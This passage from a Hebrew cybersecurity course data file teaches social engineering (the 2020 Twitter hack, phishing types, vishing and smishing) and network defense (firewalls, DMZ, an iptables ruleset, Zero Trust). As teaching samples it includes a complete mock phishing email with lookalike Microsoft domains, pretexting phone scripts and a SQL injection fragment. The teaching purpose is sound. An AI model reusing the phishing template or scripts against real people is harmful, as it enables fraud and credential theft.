            title: "נתון מפתיע",
            icon: "\\uD83D\\uDCA1",
            content: "ב-AES-256, מספר המפתחות האפשריים הוא 2 בחזקת 256 — יותר מאטומים ביקום הנצפה. גם אם כל המחשבים בעולם ינסו מיליארד מפתחות בשנייה, ייקח יותר מגיל היקום לנסות את כולם. הבעיה אף פעם לא באלגוריתם — תמיד ב-implementation."
          }
        ]
      }
    ]
  },

  // ============================================================
  // Chapter 108: Social Engineering — האיום האנושי
  // ============================================================
  {
    id: 108,
    title: "Social Engineering — האיום האנושי",
    pages: [
      {
        type: "story",
        title: "הפריצה ל-Twitter — כששלוש נערים השתלטו על העולם",
        content: `<div dir="rtl">
<div class="scenario-box scenario-hack">
  <p><strong>תרחיש:</strong> יולי 2020. "שלום, אני מ-IT של Twitter. יש בעיה טכנית בחשבון שלך." — זה כל מה שנדרש. שיחת טלפון אחת.</p>
</div>

<p>Graham Clark, בן 17 מפלורידה, התקשר לעובד Twitter והתחזה לאיש IT. הוא ביקש פרטי כניסה לפורטל הפנימי — "כדי לתקן בעיה דחופה." העובד נתן.</p>

<div class="incident-timeline">
  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">15:00</div><div class="timeline-desc"><strong>שיחת Vishing</strong> — Clark מתקשר לעובד Twitter ומתחזה לאיש IT. מקבל פרטי כניסה.</div></div>
  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">15:15</div><div class="timeline-desc"><strong>השתלטות על Admin Panel</strong> — Clark וחבריו Mason Sheppard ו-Nima Fazeli נכנסים לפורטל הפנימי.</div></div>
  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">15:30</div><div class="timeline-desc"><strong>איפוס חשבונות</strong> — אפסו סיסמאות, שינו כתובות מייל, השתלטו על 130 חשבונות מאומתים.</div></div>
  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">16:00</div><div class="timeline-desc"><strong>הונאת Bitcoin</strong> — Obama, Biden, Musk, Gates, Apple, Uber — כולם פרסמו: "Send Bitcoin and I will double it."</div></div>
</div>

<div class="stat-highlight"><span class="stat-number">$120K</span><span class="stat-unit">בביטקוין נגנבו תוך שעתיים</span></div>

<div class="warning-box"><strong>הנזק:</strong> Twitter הושבתה חלקית. שווי המניה ירד 3%. ולא פרצו שום מערכת מחשב — רק שכנעו בן אדם אחד.</div>

<p>Clark נידון ל-3 שנות מאסר. Twitter שינתה לחלוטין את מדיניות הגישה לכלים פנימיים.</p>

<p>הלקח? האקרים לא צריכים לפרוץ דלתות אם מישהו פותח להם בשמחה.</p>
</div>`
      },
      {
        type: "explanation",
        title: "אנטומיה של מייל Phishing — מה לחפש",
        content: `<div dir="rtl">
<div class="stat-highlight"><span class="stat-number">90%</span><span class="stat-unit">ממתקפות הסייבר מתחילות ב-phishing</span></div>

<p><strong>בואו נפרק מייל אחד לרכיבים.</strong> דמיינו שקיבלתם מייל מ-"PayPal":</p>

<table class="content-table">
  <tr><th>מה רואים</th><th>הטכניקה של התוקף</th><th>הדגל האדום</th></tr>
  <tr><td>שולח: support@paypa1.com</td><td>ספרה 1 במקום האות l</td><td>בדקו את הדומיין אות-אות</td></tr>
  <tr><td>כותרת: "חשבונך הוגבל — פעל עכשיו"</td><td>יצירת פאניקה ודחיפות</td><td>חברות אמיתיות לא מאיימות כך</td></tr>
  <tr><td>גוף: לוגו מקצועי, עיצוב מושלם</td><td>העתקה מדויקת מ-PayPal</td><td>חפשו שגיאות כתיב קטנות</td></tr>
  <tr><td>קישור: paypal-security-update.com</td><td>דומיין שנראה רשמי</td><td>Hover — בדקו לאן באמת מוביל</td></tr>
  <tr><td>"לחץ כאן תוך 24 שעות"</td><td>לחץ זמן מונע חשיבה</td><td>לחץ זמן = דגל אדום תמיד</td></tr>
  <tr><td>קובץ מצורף: Invoice.pdf.exe</td><td>הסוואת סוג הקובץ</td><td>extension כפולה = וירוס</td></tr>
</table>

<p><strong>סוגי Phishing:</strong></p>

<div class="mini-cards">
  <div class="mini-card"><div class="mini-card-icon">📧</div><div class="mini-card-title">Mass Phishing</div><div class="mini-card-desc">מיליוני מיילים זהים. אחוז הצלחה 2-5%, אבל על מיליון אנשים זה עובד</div></div>
  <div class="mini-card"><div class="mini-card-icon">🎯</div><div class="mini-card-title">Spear Phishing</div><div class="mini-card-desc">מותאם אישית. התוקף חקר אתכם ב-LinkedIn ויודע את שם הבוס שלכם</div></div>
  <div class="mini-card"><div class="mini-card-icon">🐋</div><div class="mini-card-title">Whaling</div><div class="mini-card-desc">Spear Phishing נגד CEO/CFO: "העבר $500K לספק הזה — דחוף"</div></div>
  <div class="mini-card"><div class="mini-card-icon">🪞</div><div class="mini-card-title">Clone Phishing</div><div class="mini-card-desc">העתק של מייל לגיטימי שנשלח אליכם, עם קישור זדוני במקום המקורי</div></div>
</div>

<div class="key-point"><strong>נקודת מפתח:</strong> הכלל הפשוט ביותר: אם מייל גורם לכם להרגיש לחץ, פחד, או דחיפות — זה כנראה phishing. עצרו, בדקו, ורק אז פעלו.</div>
</div>`
      },
      {
        type: "explanation",
        title: "Vishing, Smishing ו-Pretexting — מעבר למייל",
        content: `<div dir="rtl">
<p><strong>Phishing הוא רק סוג אחד. Social Engineering קורה בכל ערוץ.</strong></p>

<div class="scenario-box scenario-alert">
  <p><strong>תרחיש Vishing:</strong> הטלפון מצלצל: "שלום, אני מבנק לאומי. זיהינו פעילות חשודה בכרטיס שלך. אנחנו צריכים את 4 הספרות האחרונות ואת הקוד שנשלח ב-SMS כדי לחסום את זה."</p>
</div>

<p>מה שקרה: התוקף כבר מנסה להתחבר לחשבונכם, וקוד ה-SMS הוא ה-<code>MFA</code> שחוסם אותו. אתם נותנים לו את הקוד — והוא פנימה.</p>

<div class="scenario-box scenario-alert">
  <p><strong>תרחיש Smishing:</strong> "חבילה ממתינה לכם בדואר. לאימות לחצו כאן: bit.ly/pkg-track" — הקישור מוביל לדף מזויף שמבקש פרטי כרטיס אשראי "לתשלום דמי משלוח."</p>
</div>

<div class="scenario-box scenario-story">
  <p><strong>תרחיש Pretexting:</strong> "אני נציג מ-IT. אנחנו מעבירים את כל העובדים למערכת חדשה. אני צריך את הסיסמה הישנה שלך כדי להעביר את הנתונים."</p>
</div>

<table class="content-table">
  <tr><th>סוג</th><th>ערוץ</th><th>ההגנה</th></tr>
  <tr><td><span class="phase-badge phase-red">Vishing</span></td><td>טלפון</td><td>נתקו וחזרו למספר הרשמי מהאתר</td></tr>
  <tr><td><span class="phase-badge phase-red">Smishing</span></td><td>SMS</td><td>לעולם אל תלחצו על קישורים ב-SMS</td></tr>
  <tr><td><span class="phase-badge phase-gold">Pretexting</span></td><td>כל ערוץ</td><td>אמתו זהות בערוץ נפרד</td></tr>
  <tr><td><span class="phase-badge phase-gold">Baiting</span></td><td>פיזי</td><td>לעולם אל תחברו USB לא מוכר</td></tr>
</table>
</div>`
      },
      {
        type: "demo",
        title: "ניתוח מייל Phishing — מה הופך אותו לאמין?",
        content: `<div dir="rtl">
<p><strong>בואו ננתח מייל phishing "מקצועי" — ונלמד מה עושה אותו מסוכן</strong></p>

<div class="code-preview"><pre><code>From: security-alert@micros0ft.com
Subject: Unusual sign-in activity on your account
Date: Mon, 15 Jan 2024 09:23:14 +0000

[Microsoft Logo - copied perfectly]

We detected an unusual sign-in to your Microsoft account.

Sign-in details:
  Country/region: Russia
  IP address: 185.234.xx.xx
  Date: January 15, 2024 08:15 AM UTC
  Platform: Windows 10

If this was NOT you, secure your account immediately:
[Review Activity] --> https://login-microsft.com/verify

If this was you, you can safely ignore this email.</code></pre></div>

<p><strong>למה זה עובד כל כך טוב?</strong></p>

<div class="attack-chain">
  <div class="attack-step"><div class="attack-step-content"><strong>פחד</strong><p>"מישהו מרוסיה נכנס לחשבון שלי!"</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>דחיפות</strong><p>"אני חייב לפעול עכשיו"</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>מקצועיות</strong><p>לוגו מושלם, עיצוב זהה ל-Microsoft</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>אמינות</strong><p>פרטים ספציפיים (IP, תאריך, מדינה)</p></div></div>
</div>

<p><strong>הדגלים האדומים:</strong></p>

<div class="warning-box"><strong>שימו לב:</strong>
<br>- <code>micros0ft.com</code> — אפס במקום o. קשה לשים לב בקריאה מהירה
<br>- <code>login-microsft.com</code> — חסרה האות o. דומיין מזויף
<br>- Microsoft אמיתי שולח מ-<code>@accountprotection.microsoft.com</code></div>

<div class="key-point"><strong>נקודת מפתח:</strong> בכל מייל חשוד — בדקו את הדומיין של השולח אות-אות, עשו hover על הקישור בלי ללחוץ, ואם יש ספק — גשו ישירות לאתר הרשמי דרך הדפדפן ולא דרך המייל.</div>
</div>`
      },
      {
        type: "explanation",
        title: "תקיפה פיזית — Tailgating, USB Drops, Shoulder Surfing",
        content: `<div dir="rtl">
<p><strong>Social Engineering לא חי רק באינטרנט</strong></p>

<div class="mini-cards">
  <div class="mini-card"><div class="mini-card-icon">🚪</div><div class="mini-card-title">Tailgating</div><div class="mini-card-desc">"תחזיק לי את הדלת?" — תוקף צועד בביטחון מאחורי עובד שפתח את הדלת. העובד מחזיק — כי זה הנימוס הבסיסי. התוקף בפנים.</div></div>
  <div class="mini-card"><div class="mini-card-icon">💾</div><div class="mini-card-title">USB Drop</div><div class="mini-card-desc">"מישהו איבד פלאש" — בניסוי: 297 כונני USB פוזרו בקמפוס. 48% חוברו למחשב! USB אמיתי של תוקף: Rubber Ducky שמריץ פקודות אוטומטית.</div></div>
  <div class="mini-card"><div class="mini-card-icon">👀</div><div class="mini-card-title">Shoulder Surfing</div><div class="mini-card-desc">מבט מעל הכתף — בית קפה, רכבת, מטוס. מישהו מאחוריכם רואה סיסמאות, כרטיסי אשראי, מידע רגיש.</div></div>
  <div class="mini-card"><div class="mini-card-icon">🗑️</div><div class="mini-card-title">Dumpster Diving</div><div class="mini-card-desc">חיפוש באשפה של חברות — מסמכים לא מגורסים, דיסקים לא מחוקים, תדפיסים עם מידע רגיש.</div></div>
</div>

<div class="stat-highlight"><span class="stat-number">48%</span><span class="stat-unit">מכונני USB שפוזרו בניסוי חוברו למחשב</span></div>

<table class="content-table">
  <tr><th>תקיפה</th><th>ההגנה</th></tr>
  <tr><td>Tailgating</td><td>אל תחזיקו דלת לזרים. דרשו כרטיס לכל כניסה</td></tr>
  <tr><td>USB Drop</td><td>לעולם אל תחברו מדיה לא מוכרת. דווחו למחלקת IT</td></tr>
  <tr><td>Shoulder Surfing</td><td>מסנן פרטיות למסך, הקטנת בהירות, מודעות למקום</td></tr>
  <tr><td>Dumpster Diving</td><td>גרסו מסמכים רגישים. מחקו דיסקים לפני זריקה</td></tr>
</table>

<div class="warning-box"><strong>אזהרה:</strong> בניסוי של Stuxnet, תולעת הסייבר הכי מתוחכמת בהיסטוריה הגיעה לרשת air-gapped דרך USB. אם זה עובד על מתקן גרעיני — זה עובד על כל משרד.</div>
</div>`
      },
      {
        type: "explanation",
        title: "הגנה — איך מונעים Social Engineering",
        content: `<div dir="rtl">
<p><strong>הטכנולוגיה הכי מתקדמת לא תעזור אם עובד אחד ייפול בפח</strong></p>

<p><strong>שכבה 1: <span class="phase-badge phase-blue">הדרכת עובדים</span></strong></p>

<div class="mini-cards">
  <div class="mini-card"><div class="mini-card-icon">🎣</div><div class="mini-card-title">Phishing Simulations</div><div class="mini-card-desc">הארגון שולח phishing מזויף לעובדים ומודד מי לוחץ. לא כעונש — כלימוד</div></div>
  <div class="mini-card"><div class="mini-card-icon">🎓</div><div class="mini-card-title">Security Awareness</div><div class="mini-card-desc">סדנאות קבועות: איך מזהים מניפולציה, מה מדווחים, למי פונים</div></div>
  <div class="mini-card"><div class="mini-card-icon">🎲</div><div class="mini-card-title">Tabletop Exercises</div><div class="mini-card-desc">סימולציית תרחיש תקיפה עם ההנהלה: "מה עושים אם ה-CFO קיבל spear phishing?"</div></div>
</div>

<p><strong>שכבה 2: <span class="phase-badge phase-green">הגנות טכניות</span></strong></p>

<table class="content-table">
  <tr><th>איום</th><th>הגנה</th></tr>
  <tr><td>Email Phishing</td><td><code>SPF</code> + <code>DKIM</code> + <code>DMARC</code>, Email Gateway עם sandbox</td></tr>
  <tr><td>Credential Theft</td><td><code>MFA</code> חזק (<code>FIDO2</code> / YubiKey), Password Manager</td></tr>
  <tr><td>Insider Threat</td><td><code>Least Privilege</code>, <code>DLP</code>, User Behavior Analytics</td></tr>
  <tr><td>CEO Fraud</td><td>אישור כפול להעברות כספיות, אימות טלפוני</td></tr>
</table>

<p><strong>שכבה 3: <span class="phase-badge phase-gold">תהליכים ונהלים</span></strong></p>

<div class="defense-chain">
  <div class="attack-step"><div class="attack-step-content"><strong>כלל 1</strong><p>אף גורם לגיטימי לא יבקש סיסמה בטלפון. אף פעם.</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>כלל 2</strong><p>העברת כסף? אישור בשני ערוצים שונים.</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>כלל 3</strong><p>בקשה חשודה? נתקו, אמתו בערוץ נפרד, ואז תגיבו.</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>כלל 4</strong><p>כל בקשה לגישה רגישה עוברת Zero Trust — "Never Trust, Always Verify"</p></div></div>
</div>

<div class="key-point"><strong>נקודת מפתח:</strong> הכלל הזהב — אם בקשה גורמת לתחושת דחיפות, פחד, או לחץ לפעול "עכשיו בלי לבדוק" — זו כנראה מניפולציה. עצרו. חשבו. אמתו.</div>
</div>`
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – למה אנשים חכמים נופלים בפח?",
        intro: "<p>מהנדסים, מנכ\"לים, מומחי אבטחה — כולם נפלו ל-Social Engineering. מה עושה את המוח האנושי כל כך פגיע?</p>",
        blocks: [
          {
            title: "6 העקרונות של Cialdini",
            icon: "\\uD83E\\uDDE0",
            content: "פסיכולוג Robert Cialdini זיהה 6 מנופי שכנוע: סמכות ('אני ה-CTO'), דחיפות ('תוך שעה'), הוכחה חברתית ('כולם כבר עשו'), חיבה (שיחה ידידותית לפני הבקשה), הדדיות ('עזרתי לך, עכשיו עזור לי'), ונדירות ('הקישור האחרון'). תוקפי SE מפעילים אותם בשילוב מחושב."
          },
          {
            title: "Deepfakes — הפרק הבא",
            icon: "\\uD83C\\uDFAD",
            content: "ב-2024, עובד בחברת Arup בהונג קונג העביר $25 מיליון אחרי שיחת וידאו עם 'ה-CFO' — שהיה deepfake מלא. כשקול ופנים ניתנים לזיוף בזמן אמת, אימות זהות הופך להרבה יותר מורכב. הפתרון: אימות רב-ערוצי, מילות קוד מוסכמות מראש, ואי-הסתמכות על ערוץ בודד."
          },
          {
            title: "האם אנחנו יכולים להתאמן?",
            icon: "\\uD83C\\uDFAF",
            content: "כן! מחקר הראה שאחרי 4 סימולציות phishing, אחוז הלחיצה ירד מ-30% ל-5%. המוח לומד לזהות דפוסים. אבל האפקט דועך אחרי 6 חודשים — לכן הדרכות חייבות להיות רציפות. הטריק: להפוך את זה למשחק, לא לעונש. עובד שדיווח על phishing simulation מקבל כוכב, לא נזיפה."
          }
        ]
      }
    ]
  },

  // ============================================================
  // Chapter 109: הגנה על תשתיות — Firewalls ו־Zero Trust
  // ============================================================
  {
    id: 109,
    title: "הגנה על תשתיות — Firewalls ו־Zero Trust",
    pages: [
      {
        type: "story",
        title: "Stuxnet — כשקוד מחשב הרס צנטריפוגות גרעיניות",
        content: `<div dir="rtl">
<div class="scenario-box scenario-hack">
  <p><strong>תרחיש:</strong> 2010, Natanz, איראן. צנטריפוגות העשרת אורניום מתחילות להסתובב יותר מדי מהר. ואז יותר מדי לאט. ושוב מהר. אף אחד לא מבין למה.</p>
</div>

<p>טכנאים איראנים בדקו הכול: מנועים, חשמל, מכניקה. הכול נראה תקין. המסכים הציגו ערכים נורמליים. אבל הצנטריפוגות המשיכו להתפרק — כ-1,000 מתוך 5,000.</p>

<div class="stat-highlight"><span class="stat-number">1,000</span><span class="stat-unit">צנטריפוגות הושמדו מתוך 5,000</span></div>

<p>רק כשמומחי אבטחה חיצוניים ניתחו את הרשת, התגלתה תולעת שלא הייתה דומה לשום דבר: <code>Stuxnet</code>.</p>

<p><strong>מה שמצאו הדהים את העולם:</strong></p>

<div class="attack-chain">
  <div class="attack-step"><div class="attack-step-content"><strong>4 חולשות Zero-Day</strong><p>בו-זמנית — שווי: מיליוני דולרים</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>הפצה דרך USB</strong><p>הרשת הייתה air-gapped, מנותקת מהאינטרנט</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>תקיפת SCADA ספציפית</strong><p>רק בקרים תעשייתיים של Siemens עם קונפיגורציה מסוימת</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>הסתרה מושלמת</strong><p>הציגה ערכים "נורמליים" למפעילים בזמן שהרסה ציוד</p></div></div>
</div>

<div class="key-point"><strong>Stuxnet הוכיח שלושה דברים:</strong> 1) קוד מחשב יכול לגרום לנזק פיזי. 2) Air gap לא מספיק — USB הוא וקטור תקיפה. 3) אבטחת תשתיות קריטיות היא עניין של ביטחון לאומי.</div>

<p>האחריות מיוחסת לארה"ב וישראל. מאז, מתקפות על תשתיות חשמל, מים וגז הפכו למציאות שגרתית.</p>

<p>הפרק הזה עוסק בכלים שמגנים על תשתיות: <code>Firewalls</code>, <code>DMZ</code>, <code>Zero Trust</code>, וסגמנטציה.</p>
</div>`
      },
      {
        type: "explanation",
        title: "Firewalls — הסוגים, מהבסיסי למתקדם",
        content: `<div dir="rtl">
<p><strong>תחשבו על Firewall כמו שומר בכניסה למועדון</strong></p>

<p>שומר בסיסי בודק רק תעודת זהות (IP ופורט). שומר מנוסה בודק גם הזמנה (connection state). שומר מקצועי בודק מה בתיק שלכם (deep packet inspection).</p>

<table class="content-table">
  <tr><th>סוג</th><th>שכבה</th><th>מה בודק</th><th>יתרון</th><th>חיסרון</th></tr>
  <tr><td><strong><code>Stateless</code></strong></td><td>L3/L4</td><td>IP, Port, Protocol</td><td>מהיר מאוד</td><td>לא מבין הקשר</td></tr>
  <tr><td><strong><code>Stateful</code></strong></td><td>L4</td><td>Connection state (SYN/ESTABLISHED)</td><td>מבין TCP sessions</td><td>לא רואה תוכן</td></tr>
  <tr><td><strong><code>NGFW</code></strong></td><td>L7</td><td>HTTP content, DNS, TLS SNI</td><td>מבין אפליקציות</td><td>יקר, עומס CPU</td></tr>
  <tr><td><strong><code>WAF</code></strong></td><td>L7 HTTP</td><td>SQLi, XSS, OWASP Top 10</td><td>הגנה על web apps</td><td>מוגבל ל-HTTP</td></tr>
</table>

<div class="mini-cards">
  <div class="mini-card"><div class="mini-card-icon">📋</div><div class="mini-card-title">Stateless</div><div class="mini-card-desc">שומר שבודק רק כתובת על המעטפה. "מ-10.0.0.5? לפורט 443? בסדר, תיכנס."</div></div>
  <div class="mini-card"><div class="mini-card-icon">🧠</div><div class="mini-card-title">Stateful</div><div class="mini-card-desc">שומר שזוכר. "ראיתי אותך יוצא — עכשיו אתה חוזר, אז זו אותה שיחה. מותר."</div></div>
  <div class="mini-card"><div class="mini-card-icon">🔬</div><div class="mini-card-title">NGFW</div><div class="mini-card-desc">שומר שקורא את המכתב. "מבקש פורט 443 אבל התוכן זה DNS tunneling? חסום."</div></div>
  <div class="mini-card"><div class="mini-card-icon">🌐</div><div class="mini-card-title">WAF</div><div class="mini-card-desc">שומר מומחה לאתרי אינטרנט. "מצאתי OR 1=1 בשאילתה? SQL Injection. חסום."</div></div>
</div>

<div class="key-point"><strong>נקודת מפתח:</strong> העיקרון הכי חשוב ב-Firewall הוא <code>Default Deny</code> — חסום הכול, ופתח רק את מה שנדרש באופן מפורש. זה הפוך מהאינסטינקט, אבל מאובטח בהרבה.</div>
</div>`
      },
      {
        type: "explanation",
        title: "DMZ — הטירה עם החפירה",
        content: `<div dir="rtl">
<p><strong>האנלוגיה: טירה ימי ביניימית</strong></p>

<div class="info-box"><strong>ℹ️ מידע:</strong> דמיינו טירה עם שלושה אזורים: מחוץ לחומות (האינטרנט — עוין), בין החומה החיצונית לפנימית (ה-DMZ — מרחב ביניים), ובתוך הטירה (הרשת הפנימית — מוגנת).</div>

<p>שרתים שצריכים להיות נגישים מהאינטרנט — כמו Web Server, Mail Server, DNS — יושבים ב-<code>DMZ</code>. גם אם תוקף פורץ לשרת ב-DMZ, הוא לא מגיע ישירות לרשת הפנימית עם ה-DB וה-Active Directory.</p>

<p><strong>שני Firewalls, שלושה אזורים:</strong></p>

<table class="content-table">
  <tr><th>חוק</th><th>מ-</th><th>אל</th><th>פעולה</th></tr>
  <tr><td>External FW</td><td>Internet</td><td>DMZ (443, 80)</td><td><span class="phase-badge phase-green">ALLOW</span></td></tr>
  <tr><td>External FW</td><td>Internet</td><td>Internal</td><td><span class="phase-badge phase-red">BLOCK</span></td></tr>
  <tr><td>Internal FW</td><td>DMZ</td><td>Internal DB (5432)</td><td><span class="phase-badge phase-green">ALLOW</span> (רק מה שנחוץ)</td></tr>
  <tr><td>Internal FW</td><td>DMZ</td><td>Internal (אחר)</td><td><span class="phase-badge phase-red">BLOCK</span></td></tr>
</table>

<div class="key-point"><strong>נקודת מפתח:</strong> ה-DMZ הוא "אזור הקרבה": אם שרת שם נפרץ, הנזק מוגבל. התוקף צריך לפרוץ עוד Firewall כדי להגיע למידע הרגיש. כל שכבה נוספת = יותר זמן, יותר רעש, יותר סיכוי לזיהוי.</div>
</div>`
      },
      {
        type: "demo",
        title: "חוקי Firewall — iptables בפעולה",
        content: `<div dir="rtl">
<p><strong>בואו נבנה Firewall בסיסי עם <code>iptables</code> על Linux</strong></p>

<div class="warning-box"><strong>אזהרה:</strong> אל תחסמו את עצמכם! תמיד וודאו ש-SSH מותר מה-IP שלכם לפני שמגדירים Default Deny. אחרת תינעלו מחוץ לשרת.</div>

<div class="code-preview"><pre><code># === ברירת מחדל: חסום הכול ===
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# === אפשר חיבורים שכבר מאושרים ===
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# === SSH רק מ-IP ספציפי ===
iptables -A INPUT -p tcp --dport 22 -s 10.0.0.5 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP

# === Web Server ===
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT

# === חסום ping floods ===
iptables -A INPUT -p icmp --icmp-type echo-request \\
  -m limit --limit 1/s --limit-burst 4 -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# === הצג חוקים ===
iptables -L -n -v --line-numbers</code></pre></div>

<p><strong>קריאת החוקים — מלמעלה למטה:</strong></p>

<div class="defense-chain">
  <div class="attack-step"><div class="attack-step-content"><strong>Default Deny</strong><p>ברירת מחדל: הכול חסום</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>Established</strong><p>חיבורים שכבר אושרו ממשיכים לעבור</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>SSH מוגבל</strong><p>SSH מותר רק מ-10.0.0.5 — כל IP אחר נחסם</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>Web פתוח</strong><p>HTTPS ו-HTTP פתוחים לכולם</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>Rate Limit</strong><p>Ping מוגבל ל-1 לשנייה למניעת הצפה</p></div></div>
</div>

<div class="success-box"><strong>✅ תרגול:</strong> הקימו VM עם Linux, הפעילו את החוקים, ונסו לגשת מ-IP שונים. שימו לב: iptables מעבד חוקים מלמעלה למטה — הסדר חשוב! חוק ACCEPT לפני DROP יאשר, DROP לפני ACCEPT יחסום.</div>
</div>`
      },
      {
        type: "explanation",
        title: "Zero Trust — 'אל תאמין לאף אחד, תמיד אמת'",
        content: `<div dir="rtl">
<div class="vs-container">
  <div class="vs-card vs-bad"><h4>❌ המודל הישן: Castle & Moat</h4><p>חומה חזקה מבחוץ (Firewall), אמון מוחלט בפנים. אם עברת את החומה — חופש מוחלט ברשת. כשתוקף נכנס — Lateral Movement חופשי.</p></div>
  <div class="vs-card vs-good"><h4>✅ Zero Trust: כל דלת נעולה</h4><p>"Never Trust, Always Verify" — כל גישה דורשת אימות. גם אם אתה בפנים. כל בקשה נבדקת: מי, מאיפה, למה, מתי.</p></div>
</div>

<div class="scenario-box scenario-alert">
  <p><strong>תרחיש:</strong> SolarWinds 2020 — תוקפים רוסים נעו ברשתות של 18,000 ארגונים חודשים ארוכים בלי שנתפסו. הם עברו את ה-"חומה" ונהנו מאמון מוחלט בפנים.</p>
</div>

<p><strong>Zero Trust = "Never Trust, Always Verify"</strong></p>

<table class="content-table">
  <tr><th>עיקרון</th><th>בפועל</th></tr>
  <tr><td><code>Verify Explicitly</code></td><td>כל גישה דורשת MFA + בדיקת מכשיר + הקשר משתמש</td></tr>
  <tr><td><code>Least Privilege</code></td><td>גישה מינימלית. מפתח לא ניגש ל-HR. HR לא ניגש לקוד</td></tr>
  <tr><td><code>Assume Breach</code></td><td>תכנן כאילו התוקף כבר בפנים. בידוד, logging, anomaly detection</td></tr>
</table>

<div class="info-box"><strong>ℹ️ דוגמה מעשית:</strong> עובד רוצה לגשת למסד נתונים פנימי. במודל ישן: הוא ברשת, מותר. ב-Zero Trust: מי אתה? (MFA) מאיזה מכשיר? (device posture) מאיפה? (geolocation) מתי? (שעות עבודה) למה אתה צריך את זה? (least privilege). רק אם הכול מתאים — גישה.</div>

<div class="key-point"><strong>נקודת מפתח:</strong> Zero Trust הוא לא מוצר שקונים — זו פילוסופיה שמיישמים. Google הטמיעה את זה ב-<code>BeyondCorp</code> ב-2014. היום זה התקן בכל ארגון רציני.</div>
</div>`
      },
      {
        type: "explanation",
        title: "סגמנטציה — VLAN ו-Microsegmentation",
        content: `<div dir="rtl">
<p><strong>אם התוקף כבר בפנים — הגבילו לאן הוא יכול ללכת</strong></p>

<p><strong>VLAN — בידוד ברמת הרשת</strong></p>
<p>במקום רשת אחת שטוחה שבה כולם רואים את כולם, מחלקים לתתי-רשתות לוגיות:</p>

<table class="content-table">
  <tr><th>VLAN</th><th>מי שם</th><th>גישה ל-</th></tr>
  <tr><td>VLAN 10</td><td>HR</td><td>שרת HR, מדפסת HR</td></tr>
  <tr><td>VLAN 20</td><td>Development</td><td>Git, CI/CD, staging</td></tr>
  <tr><td>VLAN 30</td><td>Finance</td><td>ERP, בנקאות</td></tr>
  <tr><td>VLAN 100</td><td>Servers</td><td>לפי חוקים ספציפיים</td></tr>
</table>

<div class="success-box"><strong>✅ הגנה:</strong> אם עובד HR נפרץ — התוקף תקוע ב-VLAN 10. הוא לא רואה את שרתי הפיתוח ולא את מסד הנתונים הפיננסי.</div>

<p><strong>Microsegmentation — בידוד של כל workload</strong></p>
<p>הרמה הבאה: כל שרת, כל VM, כל container מבודד בנפרד. גם שני שרתים באותו VLAN לא מדברים ביניהם אלא אם יש חוק מפורש.</p>

<p><strong>כלים:</strong></p>

<div class="mini-cards">
  <div class="mini-card"><div class="mini-card-icon">🔷</div><div class="mini-card-title">VMware NSX</div><div class="mini-card-desc">microsegmentation ב-data center</div></div>
  <div class="mini-card"><div class="mini-card-icon">🐝</div><div class="mini-card-title">Cilium</div><div class="mini-card-desc">network policies ב-Kubernetes</div></div>
  <div class="mini-card"><div class="mini-card-icon">☁️</div><div class="mini-card-title">Cloudflare / Zscaler</div><div class="mini-card-desc">Zero Trust access ללא VPN</div></div>
  <div class="mini-card"><div class="mini-card-icon">🔐</div><div class="mini-card-title">HashiCorp Vault</div><div class="mini-card-desc">dynamic secrets, Just-In-Time credentials</div></div>
</div>

<div class="key-point"><strong>נקודת מפתח:</strong> <code>Defense in Depth</code> — שכבות הגנה: Firewall + DMZ + VLAN + Microsegmentation + Zero Trust + MFA + Logging. תוקף צריך לעבור את כולן. כל שכבה מאטה, כל שכבה מייצרת לוגים, כל שכבה מגדילה את הסיכוי לזיהוי.</div>
</div>`
      },
      {
        type: "simulation",
        title: "הדמיית Firewall",
        simId: "firewall",
        content: "<p>שלחו חבילות לקיר האש וראו אילו חוקים חלים.</p>"
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – האם Firewall יכול לעצור USB?",
        intro: "<p>Stuxnet עקף air gap עם USB. מה עוד Firewalls לא יכולים לעצור — ומה הגבולות של אבטחה דיגיטלית מול איומים פיזיים?</p>",
        blocks: [
          {
            title: "הפער הפיזי-דיגיטלי",
            icon: "\\uD83D\\uDD0C",
            content: "Firewall מסנן תעבורת רשת — לא תעבורת USB, לא חדירה פיזית, לא עובד פנימי זדוני. Stuxnet הופץ ב-USB. מתקפת Colonial Pipeline (2021) החלה מסיסמת VPN שדלפה. התשובה: Defense in Depth — הגנה פיזית (מצלמות, כרטיסים), הגנה דיגיטלית (Firewall, VLAN), והגנה אנושית (training, Zero Trust)."
          },
          {
            title: "OT vs IT — שני עולמות",
            icon: "\\u2699\\uFE0F",
            content: "מערכות תעשייתיות (OT) — חשמל, מים, ייצור — לא תוכננו לאבטחה. PLC של מפעל עשוי לרוץ על Windows XP ללא patches. עדכון = עצירת הייצור = מיליוני דולרים. לכן הפתרון הוא בידוד מוחלט: רשת OT נפרדת מ-IT, עם data diodes חד-כיוונים."
          },
          {
            title: "מלחמת סייבר אמיתית",
            icon: "\\u26A1",
